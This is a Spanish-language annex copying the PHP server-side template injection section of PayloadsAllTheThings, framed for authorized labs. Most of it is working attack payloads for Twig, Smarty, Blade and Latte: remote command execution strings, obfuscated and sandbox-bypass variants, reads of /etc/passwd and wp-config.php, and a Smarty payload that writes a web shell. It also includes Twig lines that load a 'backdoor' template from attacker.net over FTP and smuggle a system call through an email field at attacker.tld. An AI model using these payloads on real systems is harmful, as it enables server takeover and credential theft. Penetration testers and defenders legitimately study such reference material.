# Server-Side Template Injection (SSTI): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Server Side Template Injection/PHP.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inyección en plantillas del servidor - PHP / Templating Libraries

### Variantes presentes en tablas o texto del apartado

```text
{{ }}
{ }
<?= ?>
```

## 2. Inyección en plantillas del servidor - PHP / Universal Payloads

```php
// Rendered RCE
shell_exec('id')
system('id')

// Error-Based RCE
ini_set("error_reporting", "1") // Enable verbose fatal errors for Error-Based
call_user_func(join("", ["xx", shell_exec('id')]))

// Boolean-Based RCE
1 / (pclose(popen("id", "wb")) == 0)

// Time-Based RCE
shell_exec('id && sleep 5')
system('id && sleep 5')
```

## 3. Inyección en plantillas del servidor - PHP / Blade

```php
{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
```

### Variantes presentes en tablas o texto del apartado

```text
{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}
```

## 4. Inyección en plantillas del servidor - PHP / Smarty

```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3, deprecated in v5
{system('cat index.php')} // compatible v3, deprecated in v5
```

## 5. Smarty / Smarty - Ejecución de código Con Obfuscation

```php
{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
```

### Variantes presentes en tablas o texto del apartado

```text
{chr(105)|cat:chr(100)}
```

## 6. Twig / Twig - Básicos Inyección

```php
{{7*7}}
{{7*'7'}} would result in 49
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
```

## 7. Twig / Twig - Template Format

```php
$output = $twig > render (
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```

## 8. Twig / Twig - Arbitrary Archivo Reading

```php
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```

## 9. Twig / Twig - Ejecución de código

```php
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
{{['nslookup oastify.com']|filter('system')}}

{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %} // Enable verbose error output for Error-Based
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%include ["Y:/A:/", _self.env.getFilter("id")]|join%} // Error-Based RCE <= 1.19
{{[0]|map(["xx", {"id": "shell_exec"}|map("call_user_func")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0

{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE <= 1.19
{{1/({"id && echo UniqueString":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0

{% set a = ["error_reporting", "1"]|sort("ini_set") %}{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}{{ ["id", 0]|sort("system") }}{% set a = ["ob_end_flush", []]|sort("call_user_func_array")%} // Error-Based RCE with sandbox bypass using CVE-2022-23614
{{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614
```

```php
{{ {'id':'shell_exec'}|map('call_user_func')|join }}
```

```python
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
```

```powershell
POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
```

## 10. Twig / Twig - Ejecución de código Con Obfuscation

```twig
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

```twig
{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
```

### Variantes presentes en tablas o texto del apartado

```text
_charset
_context
```

## 11. Latte / Latte - Básicos Inyección

```php
{var $X="POC"}{$X}
```

## 12. Latte / Latte - Ejecución de código

```php
{php system('nslookup oastify.com')}
```

## 13. Inyección en plantillas del servidor - PHP / PatTemplate

```xml
<patTemplate:tmpl name="page">
  This is the main page.
  <patTemplate:tmpl name="foo">
    It contains another template.
  </patTemplate:tmpl>
  <patTemplate:tmpl name="hello">
    Hello {NAME}.<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```

## 14. Inyección en plantillas del servidor - PHP / PHPlib and HTML_Template_PHPLIB

```html
<html>
 <head><title>{PAGE_TITLE}</title></head>
 <body>
  <table>
   <caption>Authors</caption>
   <thead>
    <tr><th>Name</th><th>Email</th></tr>
   </thead>
   <tfoot>
    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
   </tfoot>
   <tbody>
<!-- BEGIN authorline -->
    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
   </tbody>
  </table>
 </body>
</html>
```

```php
<?php
//we want to display this author list
$authors = array(
    'Christian Weiske'  => 'usuario@example.test',
    'Bjoern Schotte'     => 'usuario@example.test'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
    $t->setVar('AUTHOR_NAME', $name);
    $t->setVar('AUTHOR_EMAIL', $email);
    $t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```

### Variantes presentes en tablas o texto del apartado

```text
authors.tpl
authors.php
```

## 15. Inyección en plantillas del servidor - PHP / Plates

```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```

```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```

```php
<html>
  <head>
    <title><?=$this->e($title)?></title>
  </head>
  <body>
    <?=$this->section('content')?>
  </body>
</html>
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
